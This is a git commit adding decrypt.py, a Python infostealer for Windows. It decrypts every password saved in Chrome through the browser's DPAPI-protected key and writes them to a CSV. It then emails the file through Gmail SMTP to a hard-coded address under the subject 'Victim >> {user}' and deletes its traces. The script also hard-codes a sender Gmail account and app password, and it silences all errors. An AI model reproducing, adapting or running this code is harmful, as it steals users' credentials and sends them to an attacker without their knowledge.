1fc452072d2451858c3fae1a96c5e16a25458a3f
Samplayswthpython <166288160+Samplayswthpython@users.noreply.github.com>
2024-04-07 21:04:59 +0530

    Add files via upload

---
+++ decrypt.py
@@ -0,0 +1,155 @@
+#!/usr/bin/enc python3 
+
+#Full Credits to Sam_sepiol
+import os
+while True:
+    try:
+        os.system("pip install pycryptodomex")
+        os.system("pip install pypiwin32")
+        break
+    except:
+        pass
+import re
+import sys
+import json
+import base64
+import sqlite3
+import win32crypt
+from Cryptodome.Cipher import AES
+import shutil
+import csv
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email.mime.text import MIMEText
+from email import encoders
+
+
+#GLOBAL CONSTANT
+CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
+CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
+
+def get_secret_key():
+    try:
+        #(1) Get secretkey from chrome local state
+        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
+            local_state = f.read()
+            local_state = json.loads(local_state)
+        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        #Remove suffix DPAPI
+        secret_key = secret_key[5:] 
+        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
+        return secret_key
+    except Exception as e:
+        return None
+    
+def decrypt_payload(cipher, payload):
+    return cipher.decrypt(payload)
+
+def generate_cipher(aes_key, iv):
+    return AES.new(aes_key, AES.MODE_GCM, iv)
+
+def decrypt_password(ciphertext, secret_key):
+    try:
+        #(3-a) Initialisation vector for AES decryption
+        initialisation_vector = ciphertext[3:15]
+        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
+        #Encrypted password is 192 bits
+        encrypted_password = ciphertext[15:-16]
+        #(4) Build the cipher to decrypt the ciphertext
+        cipher = generate_cipher(secret_key, initialisation_vector)
+        decrypted_pass = decrypt_payload(cipher, encrypted_password)
+        decrypted_pass = decrypted_pass.decode()  
+        return decrypted_pass
+    except Exception as e:
+       return ""
+    
+def get_db_connection(chrome_path_login_db):
+    try:
+        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
+        return sqlite3.connect("Loginvault.db")
+    except Exception as e:
+        return None
+
+def send_email(sender_email, sender_password, recipient_email, subject, body, attachment_path):
+    msg = MIMEMultipart()
+    msg['Subject'] = subject
+    msg['From'] = sender_email
+    msg['To'] = recipient_email
+    
+    # Attach body text
+    msg.attach(MIMEText(body, "plain"))
+
+    # Attach the file
+    filename = attachment_path
+    part = MIMEBase("application", "octet-stream")
+    with open(filename, "rb") as attachment:
+        part.set_payload(attachment.read())
+    encoders.encode_base64(part)
+    part.add_header("Content-Disposition", f"attachment; filename= {os.path.basename(filename)}")
+
+    msg.attach(part)
+
+    try:
+        # Connect to the SMTP server
+        with smtplib.SMTP('smtp.gmail.com', 587) as server:
+            server.starttls()
+            server.login(sender_email, sender_password)
+            server.send_message(msg)
+    except Exception as e:
+        pass
+
+if __name__ == '__main__':
+    try:
+        #Create Dataframe to store passwords
+        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
+            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
+            csv_writer.writerow(["index","url","username","password"])
+            #(1) Get secret key
+            secret_key = get_secret_key()
+            #Search user profile or default folder (this is where the encrypted login password is stored)
+            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
+            for folder in folders:
+            	#(2) Get ciphertext from sqlite database
+                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
+                conn = get_db_connection(chrome_path_login_db)
+                if(secret_key and conn):
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+                    for index,login in enumerate(cursor.fetchall()):
+                        url = login[0]
+                        username = login[1]
+                        ciphertext = login[2]
+                        if(url!="" and username!="" and ciphertext!=""):
+                            #(3) Filter the initialisation vector & encrypted password from ciphertext 
+                            #(4) Use AES algorithm to decrypt the password
+                            decrypted_password = decrypt_password(ciphertext, secret_key)
+                            #(5) Save into CSV 
+                            csv_writer.writerow([index,url,username,decrypted_password])
+                    #Close database connection
+                    cursor.close()
+                    conn.close()
+                    #Delete temp login db
+                    os.remove("Loginvault.db")
+    except Exception as e:
+        pass
+    finally:
+        a = os.getcwd()
+        user = os.getlogin()
+        print(user)
+        subject = f"Victim >> {user}"
+        body = ""
+        path = a + "\\decrypted_password.csv"
+        sender_email = 'iamqwertyfish@gmail.com'
+        sender_password = 'gdym qzfa ugfd qngz'
+        recipient_email = 'sepiolsam2023@gmail.com'
+        
+        try:
+            send_email(sender_email = sender_email , sender_password = sender_password , recipient_email = recipient_email , 
+                    subject = subject , body = body , attachment_path = path)
+
+            os.remove(path)
+
+        except:
+            pass
+            
